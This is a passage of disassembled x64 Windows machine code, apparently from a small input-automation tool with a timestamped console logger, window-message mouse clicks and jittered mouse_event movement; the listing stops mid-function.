0000000140001000  lea      rcx, [rip + 0x63c9]                              ; 0x1400073d0
0000000140001007  jmp      0x140006880                                      ; 0x140006880
000000014000100c  int3                                                     
000000014000100d  int3                                                     
000000014000100e  int3                                                     
000000014000100f  int3                                                     
0000000140001010  lea      rax, [rip + 0xb269]                              ; 0x14000c280
0000000140001017  ret                                                      

; FUNCTION 0x140001018

0000000140001018  mov      rax, rsp                                        
000000014000101b  mov      qword ptr [rax + 8], rcx                        
000000014000101f  mov      qword ptr [rax + 0x10], rdx                     
0000000140001023  mov      qword ptr [rax + 0x18], r8                      
0000000140001027  mov      qword ptr [rax + 0x20], r9                      
000000014000102b  push     rbx                                             
000000014000102c  push     rdi                                             
000000014000102d  sub      rsp, 0x38                                        ; 0x38
0000000140001031  mov      ecx, 1                                           ; 0x1
0000000140001036  lea      rdi, [rax + 0x10]                               
000000014000103a  call     qword ptr [rip + 0x7490]                         ; 0x1400084d0 api-ms-win-crt-stdio-l1-1-0.dll!__acrt_iob_func
0000000140001040  mov      rbx, rax                                        
0000000140001043  call     0x140001010                                      ; 0x140001010
0000000140001048  mov      r8, qword ptr [rsp + 0x50]                      
000000014000104d  xor      r9d, r9d                                        
0000000140001050  mov      rdx, rbx                                        
0000000140001053  mov      qword ptr [rsp + 0x20], rdi                     
0000000140001058  mov      rcx, qword ptr [rax]                            
000000014000105b  call     qword ptr [rip + 0x748f]                         ; 0x1400084f0 api-ms-win-crt-stdio-l1-1-0.dll!__stdio_common_vfprintf
0000000140001061  add      rsp, 0x38                                        ; 0x38
0000000140001065  pop      rdi                                             
0000000140001066  pop      rbx                                             
0000000140001067  ret                                                      

; FUNCTION 0x140001068

0000000140001068  mov      qword ptr [rsp + 0x18], r8                      
000000014000106d  mov      qword ptr [rsp + 0x20], r9                      
0000000140001072  push     rbx                                             
0000000140001073  push     rbp                                             
0000000140001074  push     rsi                                             
0000000140001075  push     rdi                                             
0000000140001076  sub      rsp, 0x38                                        ; 0x38
000000014000107a  mov      rsi, r8                                         
000000014000107d  lea      rbp, [rsp + 0x78]                               
0000000140001082  mov      rdi, rdx                                        
0000000140001085  mov      rbx, rcx                                        
0000000140001088  call     0x140001010                                      ; 0x140001010
000000014000108d  mov      qword ptr [rsp + 0x28], rbp                     
0000000140001092  mov      r9, rsi                                         
0000000140001095  mov      r8, rdi                                         
0000000140001098  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
00000001400010a1  mov      rdx, rbx                                        
00000001400010a4  mov      rcx, qword ptr [rax]                            
00000001400010a7  call     qword ptr [rip + 0x743b]                         ; 0x1400084e8 api-ms-win-crt-stdio-l1-1-0.dll!__stdio_common_vsprintf_s
00000001400010ad  or       ecx, 0xffffffff                                  ; 0xffffffff
00000001400010b0  test     eax, eax                                        
00000001400010b2  cmovs    eax, ecx                                        
00000001400010b5  add      rsp, 0x38                                        ; 0x38
00000001400010b9  pop      rdi                                             
00000001400010ba  pop      rsi                                             
00000001400010bb  pop      rbp                                             
00000001400010bc  pop      rbx                                             
00000001400010bd  ret                                                      
00000001400010be  int3                                                     
00000001400010bf  int3                                                     

; FUNCTION 0x1400010c0

00000001400010c0  push     rbx                                             
00000001400010c2  sub      rsp, 0x20                                        ; 0x20
00000001400010c6  mov      rbx, rcx                                        
00000001400010c9  mov      rax, rdx                                        
00000001400010cc  lea      rcx, [rip + 0x7575]                              ; 0x140008648
00000001400010d3  xorps    xmm0, xmm0                                      
00000001400010d6  mov      qword ptr [rbx], rcx                            
00000001400010d9  lea      rdx, [rbx + 8]                                  
00000001400010dd  lea      rcx, [rax + 8]                                  
00000001400010e1  movups   xmmword ptr [rdx], xmm0                         
00000001400010e4  call     qword ptr [rip + 0x72b6]                         ; 0x1400083a0 VCRUNTIME140.dll!__std_exception_copy
00000001400010ea  mov      rax, rbx                                        
00000001400010ed  add      rsp, 0x20                                        ; 0x20
00000001400010f1  pop      rbx                                             
00000001400010f2  ret                                                      
00000001400010f3  int3                                                     
00000001400010f4  cmp      qword ptr [rcx + 8], 0                           ; 0x0
00000001400010f9  lea      rax, [rip + 0x7598]                              ; 0x140008698 "Unknown exception"
0000000140001100  cmovne   rax, qword ptr [rcx + 8]                        
0000000140001105  ret                                                      
0000000140001106  int3                                                     
0000000140001107  int3                                                     

; FUNCTION 0x140001108

0000000140001108  mov      qword ptr [rsp + 8], rbx                        
000000014000110d  push     rdi                                             
000000014000110e  sub      rsp, 0x20                                        ; 0x20
0000000140001112  lea      rax, [rip + 0x752f]                              ; 0x140008648
0000000140001119  mov      rdi, rcx                                        
000000014000111c  mov      qword ptr [rcx], rax                            
000000014000111f  mov      ebx, edx                                        
0000000140001121  add      rcx, 8                                           ; 0x8
0000000140001125  call     qword ptr [rip + 0x727d]                         ; 0x1400083a8 VCRUNTIME140.dll!__std_exception_destroy
000000014000112b  test     bl, 1                                            ; 0x1
000000014000112e  je       0x14000113d                                      ; 0x14000113d
0000000140001130  mov      edx, 0x18                                        ; 0x18
0000000140001135  mov      rcx, rdi                                        
0000000140001138  call     0x140006310                                      ; 0x140006310
000000014000113d  mov      rbx, qword ptr [rsp + 0x30]                     
0000000140001142  mov      rax, rdi                                        
0000000140001145  add      rsp, 0x20                                        ; 0x20
0000000140001149  pop      rdi                                             
000000014000114a  ret                                                      
000000014000114b  int3                                                     
000000014000114c  lea      rax, [rip + 0x74f5]                              ; 0x140008648
0000000140001153  mov      qword ptr [rcx], rax                            
0000000140001156  add      rcx, 8                                           ; 0x8
000000014000115a  jmp      qword ptr [rip + 0x7247]                         ; 0x1400083a8 VCRUNTIME140.dll!__std_exception_destroy
0000000140001161  int3                                                     
0000000140001162  int3                                                     
0000000140001163  int3                                                     
0000000140001164  lea      rax, [rip + 0x7545]                              ; 0x1400086b0 "bad array new length"
000000014000116b  mov      qword ptr [rcx + 0x10], 0                        ; 0x0
0000000140001173  mov      qword ptr [rcx + 8], rax                        
0000000140001177  lea      rax, [rip + 0x750a]                              ; 0x140008688
000000014000117e  mov      qword ptr [rcx], rax                            
0000000140001181  mov      rax, rcx                                        
0000000140001184  ret                                                      
0000000140001185  int3                                                     
0000000140001186  int3                                                     
0000000140001187  int3                                                     
0000000140001188  int3                                                     
0000000140001189  int3                                                     
000000014000118a  int3                                                     
000000014000118b  int3                                                     
000000014000118c  int3                                                     
000000014000118d  int3                                                     
000000014000118e  int3                                                     
000000014000118f  int3                                                     

; FUNCTION 0x140001190

0000000140001190  sub      rsp, 0x48                                        ; 0x48
0000000140001194  lea      rcx, [rsp + 0x20]                               
0000000140001199  call     0x140001164                                      ; 0x140001164
000000014000119e  lea      rdx, [rip + 0x914b]                              ; 0x14000a2f0
00000001400011a5  lea      rcx, [rsp + 0x20]                               
00000001400011aa  call     0x140006f02                                      ; 0x140006f02
00000001400011af  int3                                                     

; FUNCTION 0x1400011b0

00000001400011b0  push     rbx                                             
00000001400011b2  sub      rsp, 0x20                                        ; 0x20
00000001400011b6  mov      rbx, rcx                                        
00000001400011b9  mov      rax, rdx                                        
00000001400011bc  lea      rcx, [rip + 0x7485]                              ; 0x140008648
00000001400011c3  xorps    xmm0, xmm0                                      
00000001400011c6  mov      qword ptr [rbx], rcx                            
00000001400011c9  lea      rdx, [rbx + 8]                                  
00000001400011cd  lea      rcx, [rax + 8]                                  
00000001400011d1  movups   xmmword ptr [rdx], xmm0                         
00000001400011d4  call     qword ptr [rip + 0x71c6]                         ; 0x1400083a0 VCRUNTIME140.dll!__std_exception_copy
00000001400011da  lea      rax, [rip + 0x74a7]                              ; 0x140008688
00000001400011e1  mov      qword ptr [rbx], rax                            
00000001400011e4  mov      rax, rbx                                        
00000001400011e7  add      rsp, 0x20                                        ; 0x20
00000001400011eb  pop      rbx                                             
00000001400011ec  ret                                                      
00000001400011ed  int3                                                     
00000001400011ee  int3                                                     
00000001400011ef  int3                                                     

; FUNCTION 0x1400011f0

00000001400011f0  push     rbx                                             
00000001400011f2  sub      rsp, 0x20                                        ; 0x20
00000001400011f6  mov      rbx, rcx                                        
00000001400011f9  mov      rax, rdx                                        
00000001400011fc  lea      rcx, [rip + 0x7445]                              ; 0x140008648
0000000140001203  xorps    xmm0, xmm0                                      
0000000140001206  mov      qword ptr [rbx], rcx                            
0000000140001209  lea      rdx, [rbx + 8]                                  
000000014000120d  lea      rcx, [rax + 8]                                  
0000000140001211  movups   xmmword ptr [rdx], xmm0                         
0000000140001214  call     qword ptr [rip + 0x7186]                         ; 0x1400083a0 VCRUNTIME140.dll!__std_exception_copy
000000014000121a  lea      rax, [rip + 0x743f]                              ; 0x140008660
0000000140001221  mov      qword ptr [rbx], rax                            
0000000140001224  mov      rax, rbx                                        
0000000140001227  add      rsp, 0x20                                        ; 0x20
000000014000122b  pop      rbx                                             
000000014000122c  ret                                                      
000000014000122d  int3                                                     
000000014000122e  int3                                                     
000000014000122f  int3                                                     

; FUNCTION 0x140001230

0000000140001230  sub      rsp, 0x28                                        ; 0x28
0000000140001234  lea      rcx, [rip + 0x748d]                              ; 0x1400086c8 "string too long"
000000014000123b  call     qword ptr [rip + 0x6fc7]                         ; 0x140008208 MSVCP140.dll!?_Xlength_error@std@@YAXPEBD@Z
0000000140001241  int3                                                     
0000000140001242  int3                                                     
0000000140001243  int3                                                     
0000000140001244  lea      rax, [rip + 0x74c5]                              ; 0x140008710 "bad cast"
000000014000124b  mov      qword ptr [rcx + 0x10], 0                        ; 0x0
0000000140001253  mov      qword ptr [rcx + 8], rax                        
0000000140001257  lea      rax, [rip + 0x7e6a]                              ; 0x1400090c8
000000014000125e  mov      qword ptr [rcx], rax                            
0000000140001261  mov      rax, rcx                                        
0000000140001264  ret                                                      
0000000140001265  int3                                                     
0000000140001266  int3                                                     
0000000140001267  int3                                                     

; FUNCTION 0x140001268

0000000140001268  sub      rsp, 0x48                                        ; 0x48
000000014000126c  lea      rcx, [rsp + 0x20]                               
0000000140001271  call     0x140001244                                      ; 0x140001244
0000000140001276  lea      rdx, [rip + 0x8fb3]                              ; 0x14000a230
000000014000127d  lea      rcx, [rsp + 0x20]                               
0000000140001282  call     0x140006f02                                      ; 0x140006f02
0000000140001287  int3                                                     

; FUNCTION 0x140001288

0000000140001288  push     rbx                                             
000000014000128a  sub      rsp, 0x20                                        ; 0x20
000000014000128e  mov      rbx, rcx                                        
0000000140001291  mov      rax, rdx                                        
0000000140001294  lea      rcx, [rip + 0x73ad]                              ; 0x140008648
000000014000129b  xorps    xmm0, xmm0                                      
000000014000129e  mov      qword ptr [rbx], rcx                            
00000001400012a1  lea      rdx, [rbx + 8]                                  
00000001400012a5  lea      rcx, [rax + 8]                                  
00000001400012a9  movups   xmmword ptr [rdx], xmm0                         
00000001400012ac  call     qword ptr [rip + 0x70ee]                         ; 0x1400083a0 VCRUNTIME140.dll!__std_exception_copy
00000001400012b2  lea      rax, [rip + 0x7e0f]                              ; 0x1400090c8
00000001400012b9  mov      qword ptr [rbx], rax                            
00000001400012bc  mov      rax, rbx                                        
00000001400012bf  add      rsp, 0x20                                        ; 0x20
00000001400012c3  pop      rbx                                             
00000001400012c4  ret                                                      
00000001400012c5  int3                                                     
00000001400012c6  int3                                                     
00000001400012c7  int3                                                     

; FUNCTION 0x1400012c8

00000001400012c8  sub      rsp, 0x28                                        ; 0x28
00000001400012cc  mov      rcx, qword ptr [rcx + 8]                        
00000001400012d0  test     rcx, rcx                                        
00000001400012d3  je       0x1400012ee                                      ; 0x1400012ee
00000001400012d5  mov      rax, qword ptr [rcx]                            
00000001400012d8  call     qword ptr [rax + 0x10]                          
00000001400012db  test     rax, rax                                        
00000001400012de  je       0x1400012ee                                      ; 0x1400012ee
00000001400012e0  mov      r8, qword ptr [rax]                             
00000001400012e3  mov      edx, 1                                           ; 0x1
00000001400012e8  mov      rcx, rax                                        
00000001400012eb  call     qword ptr [r8]                                  
00000001400012ee  add      rsp, 0x28                                        ; 0x28
00000001400012f2  ret                                                      
00000001400012f3  int3                                                     

; FUNCTION 0x1400012f4

00000001400012f4  push     rbx                                             
00000001400012f6  sub      rsp, 0x20                                        ; 0x20
00000001400012fa  mov      rbx, rcx                                        
00000001400012fd  jmp      0x14000130a                                      ; 0x14000130a
00000001400012ff  mov      ecx, 1                                           ; 0x1
0000000140001304  call     qword ptr [rip + 0x6eb6]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
000000014000130a  mov      eax, 1                                           ; 0x1
000000014000130f  xchg     dword ptr [rip + 0xaf73], eax                    ; 0x14000c288
0000000140001315  test     eax, eax                                        
0000000140001317  jne      0x1400012ff                                      ; 0x1400012ff
0000000140001319  mov      rdx, rbx                                        
000000014000131c  lea      rcx, [rip + 0xaf7d]                              ; 0x14000c2a0
0000000140001323  call     0x14000721a                                      ; 0x14000721a
0000000140001328  test     eax, eax                                        
000000014000132a  je       0x140001373                                      ; 0x140001373
000000014000132c  or       r9, 0xffffffffffffffff                           ; -0x1
0000000140001330  lea      rcx, [rip + 0xaf69]                              ; 0x14000c2a0
0000000140001337  mov      r8, rbx                                         
000000014000133a  lea      edx, [r9 + 0x41]                                
000000014000133e  call     qword ptr [rip + 0x71e4]                         ; 0x140008528 api-ms-win-crt-string-l1-1-0.dll!strncpy_s
0000000140001344  lea      rcx, [rip + 0x73d1]                              ; 0x14000871c
000000014000134b  call     0x140001018                                      ; 0x140001018
0000000140001350  mov      rdx, rbx                                        
0000000140001353  lea      rcx, [rip + 0x73ca]                              ; 0x140008724
000000014000135a  call     0x140001018                                      ; 0x140001018
000000014000135f  mov      ecx, 1                                           ; 0x1
0000000140001364  call     qword ptr [rip + 0x7166]                         ; 0x1400084d0 api-ms-win-crt-stdio-l1-1-0.dll!__acrt_iob_func
000000014000136a  mov      rcx, rax                                        
000000014000136d  call     qword ptr [rip + 0x7165]                         ; 0x1400084d8 api-ms-win-crt-stdio-l1-1-0.dll!fflush
0000000140001373  xor      eax, eax                                        
0000000140001375  xchg     dword ptr [rip + 0xaf0d], eax                    ; 0x14000c288
000000014000137b  add      rsp, 0x20                                        ; 0x20
000000014000137f  pop      rbx                                             
0000000140001380  ret                                                      
0000000140001381  int3                                                     
0000000140001382  int3                                                     
0000000140001383  int3                                                     

; FUNCTION 0x140001384

0000000140001384  mov      qword ptr [rsp + 0x18], rbx                     
0000000140001389  mov      qword ptr [rsp + 0x20], rsi                     
000000014000138e  push     rdi                                             
000000014000138f  sub      rsp, 0x70                                        ; 0x70
0000000140001393  mov      rax, qword ptr [rip + 0xaca6]                    ; 0x14000c040
000000014000139a  xor      rax, rsp                                        
000000014000139d  mov      qword ptr [rsp + 0x60], rax                     
00000001400013a2  mov      rsi, rdx                                        
00000001400013a5  mov      rdi, rcx                                        
00000001400013a8  mov      ebx, 1                                           ; 0x1
00000001400013ad  jmp      0x1400013b7                                      ; 0x1400013b7
00000001400013af  mov      ecx, ebx                                        
00000001400013b1  call     qword ptr [rip + 0x6e09]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
00000001400013b7  mov      eax, ebx                                        
00000001400013b9  xchg     dword ptr [rip + 0xaecd], eax                    ; 0x14000c28c
00000001400013bf  test     eax, eax                                        
00000001400013c1  jne      0x1400013af                                      ; 0x1400013af
00000001400013c3  lea      rcx, [rsp + 0x40]                               
00000001400013c8  call     qword ptr [rip + 0x6cba]                         ; 0x140008088 KERNEL32.DLL!GetLocalTime
00000001400013ce  movzx    edx, word ptr [rsp + 0x4c]                      
00000001400013d3  lea      rcx, [rsp + 0x50]                               
00000001400013d8  movzx    r8d, word ptr [rsp + 0x4a]                      
00000001400013de  movzx    eax, word ptr [rsp + 0x4e]                      
00000001400013e3  movzx    r9d, word ptr [rsp + 0x48]                      
00000001400013e9  mov      dword ptr [rsp + 0x30], eax                     
00000001400013ed  mov      dword ptr [rsp + 0x28], edx                     
00000001400013f1  mov      edx, 0x10                                        ; 0x10
00000001400013f6  mov      dword ptr [rsp + 0x20], r8d                     
00000001400013fb  lea      r8, [rip + 0x7326]                               ; 0x140008728 "%02d:%02d:%02d.%03d "
0000000140001402  call     0x140001068                                      ; 0x140001068
0000000140001407  lea      rdx, [rsp + 0x50]                               
000000014000140c  lea      rcx, [rip + 0x7311]                              ; 0x140008724
0000000140001413  call     0x140001018                                      ; 0x140001018
0000000140001418  mov      ecx, ebx                                        
000000014000141a  call     qword ptr [rip + 0x70b0]                         ; 0x1400084d0 api-ms-win-crt-stdio-l1-1-0.dll!__acrt_iob_func
0000000140001420  mov      rbx, rax                                        
0000000140001423  call     0x140001010                                      ; 0x140001010
0000000140001428  xor      r9d, r9d                                        
000000014000142b  mov      qword ptr [rsp + 0x20], rsi                     
0000000140001430  mov      r8, rdi                                         
0000000140001433  mov      rdx, rbx                                        
0000000140001436  mov      rcx, qword ptr [rax]                            
0000000140001439  call     qword ptr [rip + 0x70b1]                         ; 0x1400084f0 api-ms-win-crt-stdio-l1-1-0.dll!__stdio_common_vfprintf
000000014000143f  lea      rcx, [rip + 0x72fa]                              ; 0x140008740
0000000140001446  call     0x140001018                                      ; 0x140001018
000000014000144b  xor      eax, eax                                        
000000014000144d  xchg     dword ptr [rip + 0xae39], eax                    ; 0x14000c28c
0000000140001453  mov      rcx, qword ptr [rsp + 0x60]                     
0000000140001458  xor      rcx, rsp                                        
000000014000145b  call     0x1400062f0                                      ; 0x1400062f0
0000000140001460  lea      r11, [rsp + 0x70]                               
0000000140001465  mov      rbx, qword ptr [r11 + 0x20]                     
0000000140001469  mov      rsi, qword ptr [r11 + 0x28]                     
000000014000146d  mov      rsp, r11                                        
0000000140001470  pop      rdi                                             
0000000140001471  ret                                                      
0000000140001472  int3                                                     
0000000140001473  int3                                                     

; FUNCTION 0x140001474

0000000140001474  mov      rax, rsp                                        
0000000140001477  mov      qword ptr [rax + 8], rcx                        
000000014000147b  mov      qword ptr [rax + 0x10], rdx                     
000000014000147f  mov      qword ptr [rax + 0x18], r8                      
0000000140001483  mov      qword ptr [rax + 0x20], r9                      
0000000140001487  sub      rsp, 0x28                                        ; 0x28
000000014000148b  lea      rdx, [rax + 0x10]                               
000000014000148f  call     0x140001384                                      ; 0x140001384
0000000140001494  add      rsp, 0x28                                        ; 0x28
0000000140001498  ret                                                      
0000000140001499  int3                                                     
000000014000149a  int3                                                     
000000014000149b  int3                                                     

; FUNCTION 0x14000149c

000000014000149c  mov      qword ptr [rsp + 0x10], rdx                     
00000001400014a1  mov      qword ptr [rsp + 0x18], r8                      
00000001400014a6  mov      qword ptr [rsp + 0x20], r9                      
00000001400014ab  push     rbx                                             
00000001400014ac  sub      rsp, 0x20                                        ; 0x20
00000001400014b0  mov      ebx, ecx                                        
00000001400014b2  mov      ecx, 0xfffffff5                                  ; 0xfffffff5
00000001400014b7  call     qword ptr [rip + 0x6d23]                         ; 0x1400081e0 KERNEL32.DLL!GetStdHandle
00000001400014bd  mov      rcx, rax                                        
00000001400014c0  movzx    edx, bx                                         
00000001400014c3  call     qword ptr [rip + 0x6d2f]                         ; 0x1400081f8 KERNEL32.DLL!SetConsoleTextAttribute
00000001400014c9  mov      rcx, qword ptr [rsp + 0x38]                     
00000001400014ce  lea      rdx, [rsp + 0x40]                               
00000001400014d3  call     0x140001384                                      ; 0x140001384
00000001400014d8  add      rsp, 0x20                                        ; 0x20
00000001400014dc  pop      rbx                                             
00000001400014dd  ret                                                      
00000001400014de  int3                                                     
00000001400014df  int3                                                     

; FUNCTION 0x1400014e0

00000001400014e0  mov      qword ptr [rsp + 8], rbx                        
00000001400014e5  mov      qword ptr [rsp + 0x10], rsi                     
00000001400014ea  push     rdi                                             
00000001400014eb  sub      rsp, 0x20                                        ; 0x20
00000001400014ef  shl      edx, 0x10                                        ; 0x10
00000001400014f2  xor      r9d, r9d                                        
00000001400014f5  movsxd   rdi, edx                                        
00000001400014f8  mov      sil, r8b                                        
00000001400014fb  movzx    eax, cx                                         
00000001400014fe  xor      r8d, r8d                                        
0000000140001501  mov      ebx, ecx                                        
0000000140001503  or       rdi, rax                                        
0000000140001506  mov      rcx, qword ptr [rip + 0xad2b]                    ; 0x14000c238
000000014000150d  lea      edx, [r9 + 7]                                   
0000000140001511  call     qword ptr [rip + 0x6dd1]                         ; 0x1400082e8 USER32.dll!SendMessageW
0000000140001517  test     ebx, ebx                                        
0000000140001519  je       0x140001536                                      ; 0x140001536
000000014000151b  mov      rcx, qword ptr [rip + 0xad16]                    ; 0x14000c238
0000000140001522  mov      r9, rdi                                         
0000000140001525  mov      edx, 0x200                                       ; 0x200
000000014000152a  mov      r8d, 2                                           ; 0x2
0000000140001530  call     qword ptr [rip + 0x6d72]                         ; 0x1400082a8 USER32.dll!PostMessageW
0000000140001536  mov      rcx, qword ptr [rip + 0xacfb]                    ; 0x14000c238
000000014000153d  mov      r9, rdi                                         
0000000140001540  test     sil, sil                                        
0000000140001543  je       0x140001568                                      ; 0x140001568
0000000140001545  mov      edx, 0x204                                       ; 0x204
000000014000154a  mov      r8d, 2                                           ; 0x2
0000000140001550  call     qword ptr [rip + 0x6d52]                         ; 0x1400082a8 USER32.dll!PostMessageW
0000000140001556  mov      ecx, 0x14                                        ; 0x14
000000014000155b  call     qword ptr [rip + 0x6c5f]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
0000000140001561  mov      edx, 0x205                                       ; 0x205
0000000140001566  jmp      0x140001589                                      ; 0x140001589
0000000140001568  mov      edx, 0x201                                       ; 0x201
000000014000156d  mov      r8d, 1                                           ; 0x1
0000000140001573  call     qword ptr [rip + 0x6d2f]                         ; 0x1400082a8 USER32.dll!PostMessageW
0000000140001579  mov      ecx, 0x14                                        ; 0x14
000000014000157e  call     qword ptr [rip + 0x6c3c]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
0000000140001584  mov      edx, 0x202                                       ; 0x202
0000000140001589  mov      rcx, qword ptr [rip + 0xaca8]                    ; 0x14000c238
0000000140001590  mov      r9, rdi                                         
0000000140001593  xor      r8d, r8d                                        
0000000140001596  mov      rbx, qword ptr [rsp + 0x30]                     
000000014000159b  mov      rsi, qword ptr [rsp + 0x38]                     
00000001400015a0  add      rsp, 0x20                                        ; 0x20
00000001400015a4  pop      rdi                                             
00000001400015a5  jmp      qword ptr [rip + 0x6cfc]                         ; 0x1400082a8 USER32.dll!PostMessageW

; FUNCTION 0x1400015ac

00000001400015ac  push     rbx                                             
00000001400015ae  push     rbp                                             
00000001400015af  push     rsi                                             
00000001400015b0  push     rdi                                             
00000001400015b1  sub      rsp, 0x38                                        ; 0x38
00000001400015b5  xor      ebx, ebx                                        
00000001400015b7  xor      edi, edi                                        
00000001400015b9  xorps    xmm3, xmm3                                      
00000001400015bc  mov      bpl, r8b                                        
00000001400015bf  ucomisd  xmm0, xmm3                                      
00000001400015c3  movaps   xmm2, xmm1                                      
00000001400015c6  jp       0x1400015ca                                      ; 0x1400015ca
00000001400015c8  je       0x1400015e4                                      ; 0x1400015e4
00000001400015ca  movd     xmm1, dword ptr [rip + 0xac56]                   ; 0x14000c228
00000001400015d2  cvtdq2pd xmm1, xmm1                                      
00000001400015d6  divsd    xmm1, xmm0                                      
00000001400015da  cvttsd2si ebx, xmm1                                       
00000001400015de  add      ebx, dword ptr [rip + 0xac4c]                    ; 0x14000c230
00000001400015e4  ucomisd  xmm2, xmm3                                      
00000001400015e8  jp       0x1400015ec                                      ; 0x1400015ec
00000001400015ea  je       0x140001606                                      ; 0x140001606
00000001400015ec  movd     xmm0, dword ptr [rip + 0xac50]                   ; 0x14000c244
00000001400015f4  cvtdq2pd xmm0, xmm0                                      
00000001400015f8  divsd    xmm0, xmm2                                      
00000001400015fc  cvttsd2si edi, xmm0                                       
0000000140001600  add      edi, dword ptr [rip + 0xac72]                    ; 0x14000c278
0000000140001606  cmp      byte ptr [rip + 0xaaa7], 0                       ; 0x14000c0b4 | 0x0
000000014000160d  je       0x140001676                                      ; 0x140001676
000000014000160f  test     ebx, ebx                                        
0000000140001611  je       0x140001665                                      ; 0x140001665
0000000140001613  call     qword ptr [rip + 0x6f4f]                         ; 0x140008568 api-ms-win-crt-utility-l1-1-0.dll!rand
0000000140001619  mov      r8d, eax                                        
000000014000161c  mov      eax, 0x66666667                                  ; 0x66666667
0000000140001621  imul     r8d                                             
0000000140001624  sar      edx, 1                                           ; 0x1
0000000140001626  mov      ecx, edx                                        
0000000140001628  shr      ecx, 0x1f                                        ; 0x1f
000000014000162b  add      edx, ecx                                        
000000014000162d  lea      ecx, [rdx + rdx*4]                              
0000000140001630  sub      r8d, ecx                                        
0000000140001633  add      r8d, -2                                          ; -0x2
0000000140001637  add      ebx, r8d                                        
000000014000163a  call     qword ptr [rip + 0x6f28]                         ; 0x140008568 api-ms-win-crt-utility-l1-1-0.dll!rand
0000000140001640  mov      r9d, eax                                        
0000000140001643  mov      eax, 0x66666667                                  ; 0x66666667
0000000140001648  imul     r9d                                             
000000014000164b  sar      edx, 1                                           ; 0x1
000000014000164d  mov      r8d, edx                                        
0000000140001650  shr      r8d, 0x1f                                        ; 0x1f
0000000140001654  add      edx, r8d                                        
0000000140001657  lea      r8d, [rdx + rdx*4]                              
000000014000165b  sub      r9d, r8d                                        
000000014000165e  add      r9d, -2                                          ; -0x2
0000000140001662  add      edi, r9d                                        
0000000140001665  mov      r8b, bpl                                        
0000000140001668  mov      edx, edi                                        
000000014000166a  mov      ecx, ebx                                        
000000014000166c  call     0x1400014e0                                      ; 0x1400014e0
0000000140001671  jmp      0x14000176b                                      ; 0x14000176b
0000000140001676  test     ebx, ebx                                        
0000000140001678  je       0x14000171a                                      ; 0x14000171a
000000014000167e  mov      esi, dword ptr [rip + 0xaba8]                    ; 0x14000c22c
0000000140001684  add      esi, ebx                                        
0000000140001686  mov      ebx, dword ptr [rip + 0xabc0]                    ; 0x14000c24c
000000014000168c  add      ebx, edi                                        
000000014000168e  call     qword ptr [rip + 0x6ed4]                         ; 0x140008568 api-ms-win-crt-utility-l1-1-0.dll!rand
0000000140001694  mov      edi, eax                                        
0000000140001696  mov      eax, 0x66666667                                  ; 0x66666667
000000014000169b  imul     edi                                             
000000014000169d  sar      edx, 1                                           ; 0x1
000000014000169f  mov      ecx, edx                                        
00000001400016a1  shr      ecx, 0x1f                                        ; 0x1f
00000001400016a4  add      edx, ecx                                        
00000001400016a6  lea      ecx, [rdx + rdx*4]                              
00000001400016a9  sub      edi, ecx                                        
00000001400016ab  call     qword ptr [rip + 0x6eb7]                         ; 0x140008568 api-ms-win-crt-utility-l1-1-0.dll!rand
00000001400016b1  xor      r9d, r9d                                        
00000001400016b4  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
00000001400016bd  mov      r8d, eax                                        
00000001400016c0  mov      eax, 0x66666667                                  ; 0x66666667
00000001400016c5  imul     r8d                                             
00000001400016c8  sar      edx, 1                                           ; 0x1
00000001400016ca  mov      ecx, edx                                        
00000001400016cc  shr      ecx, 0x1f                                        ; 0x1f
00000001400016cf  add      edx, ecx                                        
00000001400016d1  lea      ecx, [rdx + rdx*4]                              
00000001400016d4  sub      r8d, ecx                                        
00000001400016d7  mov      ecx, dword ptr [rip + 0xab63]                    ; 0x14000c240
00000001400016dd  add      r8d, ebx                                        
00000001400016e0  imul     eax, r8d, 0xffff                                 ; 0xffff
00000001400016e7  add      eax, 0xfffe0002                                  ; 0xfffe0002
00000001400016ec  cdq                                                      
00000001400016ed  dec      ecx                                             
00000001400016ef  idiv     ecx                                             
00000001400016f1  mov      ecx, dword ptr [rip + 0xab2d]                    ; 0x14000c224
00000001400016f7  mov      r8d, eax                                        
00000001400016fa  lea      eax, [rdi + rsi]                                
00000001400016fd  imul     eax, eax, 0xffff                                 ; 0xffff
0000000140001703  sub      eax, 0x1fffe                                     ; 0x1fffe
0000000140001708  dec      ecx                                             
000000014000170a  cdq                                                      
000000014000170b  idiv     ecx                                             
000000014000170d  mov      ecx, 0x8001                                      ; 0x8001
0000000140001712  mov      edx, eax                                        
0000000140001714  call     qword ptr [rip + 0x6c36]                         ; 0x140008350 USER32.dll!mouse_event
000000014000171a  mov      al, bpl                                         
000000014000171d  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
0000000140001726  neg      al                                              
0000000140001728  sbb      ecx, ecx                                        
000000014000172a  xor      r9d, r9d                                        
000000014000172d  and      ecx, 6                                           ; 0x6
0000000140001730  xor      r8d, r8d                                        
0000000140001733  add      ecx, 2                                           ; 0x2
0000000140001736  xor      edx, edx                                        
0000000140001738  call     qword ptr [rip + 0x6c12]                         ; 0x140008350 USER32.dll!mouse_event
000000014000173e  mov      ecx, 0x14                                        ; 0x14
0000000140001743  call     qword ptr [rip + 0x6a77]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
0000000140001749  neg      bpl                                             
000000014000174c  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
0000000140001755  sbb      ecx, ecx                                        
0000000140001757  xor      r9d, r9d                                        
000000014000175a  and      ecx, 0xc                                         ; 0xc
000000014000175d  xor      r8d, r8d                                        
0000000140001760  add      ecx, 4                                           ; 0x4
0000000140001763  xor      edx, edx                                        
0000000140001765  call     qword ptr [rip + 0x6be5]                         ; 0x140008350 USER32.dll!mouse_event
000000014000176b  add      rsp, 0x38                                        ; 0x38
000000014000176f  pop      rdi                                             
0000000140001770  pop      rsi                                             
0000000140001771  pop      rbp                                             
0000000140001772  pop      rbx                                             
0000000140001773  ret                                                      

; FUNCTION 0x140001774

0000000140001774  push     rbx                                             
0000000140001776  push     rbp                                             
0000000140001777  push     rsi                                             
0000000140001778  push     rdi                                             
0000000140001779  sub      rsp, 0x28                                        ; 0x28
000000014000177d  mov      ebp, edx                                        
000000014000177f  movzx    esi, cl                                         
0000000140001782  xor      edx, edx                                        
0000000140001784  cmp      byte ptr [rip + 0xa92a], dl                      ; 0x14000c0b4
000000014000178a  je       0x1400017f6                                      ; 0x1400017f6
000000014000178c  mov      ecx, esi                                        
